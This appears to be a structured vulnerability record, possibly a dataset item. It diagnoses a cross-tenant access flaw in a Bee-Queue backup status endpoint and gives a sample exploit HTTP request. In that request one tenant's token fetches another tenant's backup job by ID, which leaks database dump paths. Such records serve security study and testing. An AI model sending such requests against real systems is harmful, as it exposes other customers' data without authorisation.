diagnosis: Bee-Queue job inspector exposes internal backup locations and database names by jobId from the URL path. It does not ensure job.data.tenantId === req.user.tenantId, leaking database dump file paths and backup statuses of other tenants.
exploit_request:
GET /api/backups/status/88421 HTTP/1.1
Host: db-ops.saascloud.com
Authorization: Bearer <tenant_b_jwt>
